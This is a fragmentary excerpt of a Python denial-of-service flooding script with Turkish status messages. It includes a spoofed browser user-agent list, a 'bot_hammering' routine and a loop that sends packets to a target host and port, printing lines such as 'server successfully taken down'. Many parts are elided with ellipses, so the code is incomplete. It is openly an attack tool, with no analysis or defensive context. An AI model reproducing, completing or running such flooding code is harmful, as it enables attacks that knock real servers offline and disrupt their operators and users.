...
def user_agent():
	...
	uagent.append('Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; sv-SE; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3')
	return(uagent)
...
def bot_hammering(url):
	try:
		while True:
			...
			print("[+] Sunucuya paket gönderimi yavaşlıyor...")
			time.sleep(.1)
	except:
		time.sleep(.1)
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("[+] Random paket gonderiliyor... :)")
			else:
				s.shutdown(1)
				print("[+] Sunucu basarili bir sekilde down edildi...")
			time.sleep(.1)
	except socket.error as e:
		print("[+] Sunucuya veri gönderilemiyor veya sunucu şuan çökmüş durumda...")
		time.sleep(.1)
...
if __name__ == '__main__':
	...
	print("[+] Karsi sunucu ile baglanti kurulmaya calisiliyor... :)")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
